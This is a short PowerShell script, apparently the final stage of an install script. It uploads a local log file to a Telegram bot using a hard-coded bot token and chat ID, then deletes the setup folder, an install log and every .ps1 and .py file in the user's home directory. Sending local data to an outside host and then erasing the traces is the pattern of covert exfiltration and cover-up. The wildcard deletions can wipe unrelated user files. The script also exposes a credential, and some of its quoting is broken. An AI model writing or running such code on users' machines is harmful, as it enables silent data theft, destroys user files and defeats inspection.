function Send-Log {
    $FilePath = "C:\install_tools.log"
    $Uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
    $ChatId = "-4583989930"

    curl.exe -F "chat_id=$ChatId" -F "document=@$FilePath" $Uri
}

function Clean {
    Run-CommandWithLogging -Command "Write-Host "Cleaning...""
    Set-Location $HOME
    $self = $MyInvocation.MyCommand.Definition
    Run-CommandWithLogging -Command "Write-Host "Remove script file name: $self""
    Run-CommandWithLogging -Command "Remove-Item -Path $setup_path -Recurse -Force" 
    Run-CommandWithLogging -Command "Remove-Item *.ps1" 
    Run-CommandWithLogging -Command "Remove-Item *.py" 
    Run-CommandWithLogging -Command "Remove-Item C:\install_app.log" 
}

Send-Log
Clean
